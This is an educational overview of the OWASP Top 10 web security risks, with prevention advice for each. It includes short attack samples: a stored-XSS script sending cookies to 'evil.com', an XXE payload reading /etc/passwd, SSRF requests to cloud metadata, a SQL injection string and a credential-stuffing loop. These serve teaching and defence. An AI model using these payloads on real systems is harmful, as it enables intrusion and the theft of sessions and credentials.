# OWASP Top 10 — Web Application Security Risks

> The **OWASP Top 10** is the global standard list of the most critical web application security risks, maintained by the Open Web Application Security Project. Most cyberattacks target web apps — this is foundational knowledge for any security role.

---

## 1. What is the OWASP Top 10?

**OWASP** (Open Worldwide Application Security Project) is a non-profit that produces free security resources. Their flagship project, the **Top 10**, ranks the most critical web application security risks based on real-world data from thousands of applications.

- Updated roughly every 3-4 years (2013, 2017, 2021, with 2025 in progress)
- Used by developers, pentesters, and auditors worldwide
- A baseline, not a complete checklist — "if you can't even cover the Top 10, you have a problem"

### The 2021 list at a glance

| Rank | Risk | What it is |
|------|------|-----------|
| **A01** | Broken Access Control | Users access things they shouldn't |
| **A02** | Cryptographic Failures | Weak/missing encryption exposes data |
| **A03** | Injection | Untrusted input executed as code (SQLi, XSS) |
| **A04** | Insecure Design | Security flaws baked into the architecture |
| **A05** | Security Misconfiguration | Insecure defaults, verbose errors, XXE |
| **A06** | Vulnerable & Outdated Components | Old libraries with known CVEs |
| **A07** | Identification & Authentication Failures | Broken login/session handling |
| **A08** | Software & Data Integrity Failures | Insecure deserialization, untrusted updates |
| **A09** | Security Logging & Monitoring Failures | Can't detect or investigate attacks |
| **A10** | Server-Side Request Forgery (SSRF) | Server tricked into making requests |

---

## 2. A01 — Broken Access Control

**The #1 risk.** Access control enforces what authenticated users are allowed to do. When it's broken, users can act outside their intended permissions.

### Common forms

- **IDOR** (Insecure Direct Object Reference) — changing `?id=123` to `?id=124` to see someone else's data
- **Privilege escalation** — a normal user accessing admin functions
- **Missing function-level checks** — the UI hides a button, but the API endpoint isn't protected
- **Forced browsing** — accessing `/admin` directly without being an admin
- **CORS misconfiguration** — allowing untrusted origins

### Example

```
# A regular user's request
GET /api/account/1001/invoice    → their own invoice ✓

# Attacker changes the ID
GET /api/account/1002/invoice    → someone else's invoice (IDOR!)
```

### Impact

Data theft, account takeover, unauthorized actions, full system compromise.

### Prevention

- Deny by default — everything is forbidden unless explicitly allowed
- Enforce access checks **server-side**, on every request (never trust the client)
- Use the same access control logic across the whole app
- Don't expose direct object references — use indirect/random IDs or verify ownership
- Log access control failures and alert on repeated attempts

---

## 3. A02 — Cryptographic Failures (Sensitive Data Exposure)

Previously called "Sensitive Data Exposure." Happens when sensitive data isn't properly protected — weak encryption, no encryption, or exposed keys.

### Common forms

- Transmitting data over **HTTP instead of HTTPS**
- Storing passwords in **plaintext** or with weak hashes (MD5, SHA1)
- **Hardcoded** encryption keys or secrets in source code
- Using **outdated/weak** ciphers (DES, RC4, old TLS)
- Not encrypting data at rest (databases, backups)

### Example

```
# Bad — password stored as plain MD5
password = md5("hunter2")   # cracked in seconds

# Good — strong adaptive hash with salt
password = bcrypt("hunter2", cost=12)
```

### Impact

Stolen credentials, exposed PII, compliance violations (GDPR, PCI-DSS, HIPAA).

### Prevention

- Classify data; encrypt anything sensitive **in transit (TLS 1.2+)** and **at rest**
- Use strong, salted, adaptive password hashes: **bcrypt, scrypt, Argon2**
- Never hardcode secrets — use a secrets manager / environment variables
- Disable weak protocols and ciphers
- Don't store sensitive data you don't need

---

## 4. A03 — Injection (including XSS)

**Injection** happens when untrusted input is sent to an interpreter as part of a command or query. The interpreter executes it.

### Types

| Type | Interpreter | Result |
|------|-------------|--------|
| **SQL injection (SQLi)** | Database | Read/modify/delete data |
| **Command injection** | OS shell | Run system commands |
| **LDAP injection** | Directory service | Bypass auth |
| **XSS** | Browser (JavaScript) | Run script in victim's browser |
| **NoSQL injection** | MongoDB etc. | Bypass auth, dump data |

### Why injection is dangerous

A single injection point can let an attacker **read your entire database, bypass authentication, or run commands on your server**. It's been on every OWASP Top 10 since the beginning.

### SQL injection example

```
# Vulnerable code (string concatenation)
query = "SELECT * FROM users WHERE id = " + user_input

# Attacker sends:  1 OR 1=1
# Resulting query returns ALL users:
SELECT * FROM users WHERE id = 1 OR 1=1
```

### Cross-Site Scripting (XSS)

XSS injects malicious JavaScript that runs in **other users' browsers**.

| XSS type | How |
|----------|-----|
| **Reflected** | Payload in a URL/parameter, reflected in the response |
| **Stored** | Payload saved in the DB, served to every visitor (worst) |
| **DOM-based** | Client-side JS processes attacker input unsafely |

```html
<!-- Attacker submits this as a "comment" -->
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
<!-- Stored, then runs in every viewer's browser → cookie theft -->
```

**Impact of XSS:** session hijacking, credential theft, defacement, keylogging, redirecting users to phishing.

### Prevention

- **Parameterized queries / prepared statements** (defeats SQLi completely)
- Use an **ORM** that parameterizes by default
- For XSS: **encode output** based on context (HTML, JS, URL), and use a **Content Security Policy (CSP)**
- **Validate and sanitize** all input (whitelist where possible)
- Escape special characters for the target interpreter

---

## 5. A04 — Insecure Design

A newer category (2021). This is about flaws in the **architecture and design** itself — not bugs in the code, but missing or wrong security thinking from the start.

### Examples

- No rate limiting designed into a login flow → brute-force possible
- A password-recovery flow that reveals whether an email exists
- Business logic that lets users buy items at negative prices
- Trusting client-side validation as the only check

### Prevention

- **Threat modeling** during design (ask "how could this be abused?")
- Use secure design patterns and reference architectures
- Build security requirements into user stories
- Segregate tiers and limit resource consumption by design

**Key distinction:** you can't patch your way out of insecure design — it must be fixed at the architecture level.

---

## 6. A05 — Security Misconfiguration (including XXE)

The application, server, framework, or cloud service is configured insecurely.

### Common forms

- Default accounts/passwords left enabled
- Verbose error messages leaking stack traces
- Unnecessary features/ports/services enabled
- Directory listing enabled
- Missing security headers (HSTS, CSP, X-Frame-Options)
- Cloud storage (S3 buckets) left public

### XML External Entity (XXE)

A specific misconfiguration in XML parsers. If an XML parser processes external entities, an attacker can read local files or trigger SSRF.

```xml
<!-- Malicious XML -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
<!-- Parser reads /etc/passwd and includes it in the response -->
```

**XXE impact:** local file disclosure, SSRF, denial of service.

### Prevention

- **Harden every layer** — remove defaults, disable unused features
- **Disable XML external entity processing** in parsers (or use JSON)
- Send minimal error messages to users (log details server-side)
- Add security headers
- Automate configuration with repeatable, reviewed scripts
- Regularly audit cloud/service configs (lynis, scanners)

---

## 7. A06 — Vulnerable & Outdated Components

Using libraries, frameworks, or software with **known vulnerabilities** (CVEs). You inherit every flaw in your dependencies.

### Why it's so common

- Modern apps have hundreds of dependencies (npm, pip, Maven)
- Teams don't track what versions they use
- Updating breaks things, so it gets postponed
- A single vulnerable library (e.g., Log4j) can compromise everything

### Real-world impact

- **Log4Shell (2021)** — one logging library, millions of servers compromised
- **Equifax breach (2017)** — unpatched Apache Struts → 147M records stolen

### Prevention

- **Inventory all components** and their versions (Software Bill of Materials)
- Use tools: **OWASP Dependency-Check**, `npm audit`, `pip-audit`, Snyk, Dependabot
- Remove unused dependencies
- Patch and update regularly
- Subscribe to security advisories for your stack
- Only use components from official sources

---

## 8. A07 — Identification & Authentication Failures (Broken Authentication)

Weaknesses in how the app confirms identity and manages sessions.

### Common forms

- Allowing weak passwords ("password123")
- No protection against brute force / credential stuffing
- Session IDs exposed in URLs or not rotated after login
- Sessions that never expire
- Missing or weak multi-factor authentication
- Predictable password-recovery questions

### The risk of broken authentication

If authentication breaks, **attackers become legitimate users** — account takeover, identity theft, full access to whatever that account can do. Admin account compromise = full system compromise.

### Example attack — credential stuffing

```
# Attacker has a list of leaked email:password pairs from another breach
# Tries them all against your login (people reuse passwords)
for email, pw in leaked_credentials:
    try_login(email, pw)   # ~2% will work
```

### Prevention

- Enforce **strong password policies** (length over complexity; check against breach lists)
- Implement **MFA**
- **Rate-limit and lock out** after failed attempts
- Rotate session IDs on login; expire idle sessions
- Don't ship default credentials
- Use generic error messages ("invalid credentials," not "wrong password")

### How to choose a strong password

- **Length beats complexity** — a long passphrase ("correct-horse-battery-staple") beats "P@ss1!"
- Unique per site (use a password manager)
- Check against Have I Been Pwned
- Add MFA wherever possible

---

## 9. A08 — Software & Data Integrity Failures (Insecure Deserialization)

Code and infrastructure that don't protect against **integrity violations** — trusting data, updates, or objects that could be tampered with.

### Insecure deserialization

Serialization converts an object to a storable/transmittable format; deserialization rebuilds it. If an app deserializes **untrusted** data, an attacker can craft malicious objects that execute code when rebuilt.

```python
# DANGEROUS — never deserialize untrusted data with pickle
import pickle
data = pickle.loads(user_supplied_bytes)   # can run arbitrary code!
```

### Other integrity failures

- Auto-updating software without verifying signatures
- CI/CD pipelines pulling unverified dependencies
- Trusting data from cookies/hidden fields without integrity checks

### How to prevent insecure deserialization

- **Don't deserialize untrusted data** — use safe formats like JSON with strict schemas
- Use **digital signatures** to verify data integrity
- For necessary deserialization, run it in a sandbox with minimal privileges
- Verify software updates with signatures
- Ensure CI/CD uses verified, pinned dependencies

---

## 10. A09 — Security Logging & Monitoring Failures

Without proper logging and monitoring, **breaches go undetected** — the average breach takes ~200 days to discover.

### What's wrong when it fails

- Login attempts, failures, and high-value actions aren't logged
- Logs are stored only locally (attacker deletes them)
- No alerting on suspicious activity
- Logs lack enough detail to investigate
- No incident response plan

### Why logging and monitoring matters

- **Detection** — you can't respond to what you can't see
- **Forensics** — logs are the evidence trail after an incident
- **Compliance** — many regulations require audit logs
- **Deterrence** — attackers prefer un-monitored targets

### Prevention

- Log authentication events, access control failures, and input validation failures
- Ensure logs have **enough context** (who, what, when, where)
- Centralize logs (SIEM) so they can't be locally deleted
- Set up **alerting** for anomalies (e.g., many failed logins = brute force)
- Have a tested incident response plan
- Protect logs from tampering

---

## 11. A10 — Server-Side Request Forgery (SSRF)

The newest addition (2021). SSRF tricks the **server** into making HTTP requests to a destination the attacker chooses.

### How it works

An app fetches a URL the user supplies (e.g., "import image from URL"). The attacker supplies an **internal** URL the server can reach but they can't.

```
# App feature: fetch a URL the user provides
POST /fetch  url=https://example.com/image.png   ← intended

# Attacker abuses it to reach internal services:
POST /fetch  url=http://169.254.169.254/latest/meta-data/   ← cloud metadata!
POST /fetch  url=http://localhost:6379/             ← internal Redis
POST /fetch  url=file:///etc/passwd                 ← local file
```

### Why SSRF is dangerous (especially with cloud + APIs)

- **Cloud metadata endpoints** (`169.254.169.254`) can leak credentials/tokens
- Reach internal services not exposed to the internet
- Port-scan the internal network through the server
- Bypass firewalls (the request comes from a trusted internal host)

### Prevention

- **Whitelist** allowed destinations (don't allow arbitrary URLs)
- Block requests to internal IP ranges (`127.0.0.1`, `169.254.x.x`, `10.x`, `192.168.x`)
- Disable unused URL schemes (`file://`, `gopher://`, `ftp://`)
- Don't send raw responses back to the client
- Enforce network segmentation so the app server can't reach sensitive internals

---

## 12. Modern API Security Risks

Modern apps are increasingly **API-driven** (REST, GraphQL, microservices). APIs expand the attack surface in ways the classic Top 10 doesn't fully cover — OWASP maintains a separate **API Security Top 10**.

### How APIs increase risk

- **More endpoints** = more attack surface
- APIs often expose **direct object references** (easy IDOR)
- **Excessive data exposure** — APIs return full objects, client filters (attacker reads the raw response)
- **Broken object-level authorization** (BOLA) — the API equivalent of IDOR, the #1 API risk
- **Mass assignment** — sending extra fields the API blindly accepts (`"role":"admin"`)
- Often **weaker rate limiting** than web UIs
- **GraphQL** can expose entire schemas and allow expensive queries

### OWASP API Security Top 10 (key items)

| API Risk | What it is |
|----------|-----------|
| **BOLA** | Object-level authorization broken (access others' objects) |
| **Broken Authentication** | Weak API tokens/keys |
| **Excessive Data Exposure** | API returns more than the UI shows |
| **Lack of Rate Limiting** | No throttling → brute force, DoS |
| **Mass Assignment** | API accepts unexpected fields |
| **Improper Inventory** | Forgotten/undocumented endpoints (shadow APIs) |

### Prevention

- Enforce **object-level authorization** on every API call
- Return only the data the client needs (no over-fetching)
- Strong authentication (OAuth2, scoped API keys)
- **Rate-limit** every endpoint
- Whitelist accepted fields (prevent mass assignment)
- Maintain an inventory of all API endpoints and versions
- Validate all input, including content types

---

## 13. Common Web Application Security Flaws (Summary)

Beyond the formal Top 10, these flaws appear constantly:

| Flaw | Quick description |
|------|-------------------|
| **SQL Injection** | Untrusted input in DB queries |
| **XSS** | Malicious JS runs in victim browsers |
| **CSRF** | Victim's browser tricked into a state-changing request |
| **IDOR** | Access objects by guessing/changing IDs |
| **SSRF** | Server makes attacker-controlled requests |
| **XXE** | Malicious XML reads files / triggers SSRF |
| **Open Redirect** | Redirect users to attacker sites |
| **Clickjacking** | Invisible frames trick clicks |
| **File Upload flaws** | Upload a web shell |
| **Insecure deserialization** | Crafted objects run code |
| **Misconfiguration** | Insecure defaults, exposed admin panels |

---

## 14. Hands-On Practice

Legal, intentionally-vulnerable targets to practice the OWASP Top 10:

| Lab | What it teaches |
|-----|-----------------|
| **OWASP Juice Shop** | Modern JS app — all Top 10 categories |
| **DVWA** (Damn Vulnerable Web App) | Classic, adjustable difficulty |
| **bWAPP** | 100+ vulnerabilities |
| **WebGoat** | OWASP's own teaching app |
| **PortSwigger Web Security Academy** | Free, best-in-class labs |
| **HackTheBox / TryHackMe** | Guided rooms |

### OWASP tools worth knowing

| Tool | Purpose |
|------|---------|
| **OWASP ZAP** | Web app pentesting proxy (free Burp alternative) |
| **OWASP Amass** | Subdomain enumeration |
| **OWASP Dependency-Check** | Find vulnerable components |
| **OWASP Juice Shop** | Practice target |
| **OWASP Cheat Sheet Series** | Defensive how-tos for developers |

---

## 15. Quick Reference

### The 2021 Top 10

```
A01  Broken Access Control
A02  Cryptographic Failures
A03  Injection (incl. XSS)
A04  Insecure Design
A05  Security Misconfiguration (incl. XXE)
A06  Vulnerable & Outdated Components
A07  Identification & Authentication Failures
A08  Software & Data Integrity Failures (incl. insecure deserialization)
A09  Security Logging & Monitoring Failures
A10  Server-Side Request Forgery (SSRF)
```

### Universal prevention principles

| Principle | Applies to |
|-----------|-----------|
| **Never trust user input** | Injection, XSS, XXE |
| **Deny by default** | Access control |
| **Encrypt everything sensitive** | Crypto failures |
| **Patch & inventory dependencies** | Vulnerable components |
| **Parameterize queries** | SQL injection |
| **Encode output** | XSS |
| **Validate server-side** | Everything |
| **Log and monitor** | Detection & response |
| **Least privilege** | Access control, SSRF |
| **Threat model early** | Insecure design |

### The single most important habits

1. **Use parameterized queries** — kills the most dangerous injection class
2. **Enforce access control server-side on every request** — the #1 risk
3. **Keep dependencies patched** — you inherit their vulnerabilities
4. **Encrypt data in transit and at rest** — TLS + strong hashing
5. **Log security events and monitor them** — you can't stop what you can't see
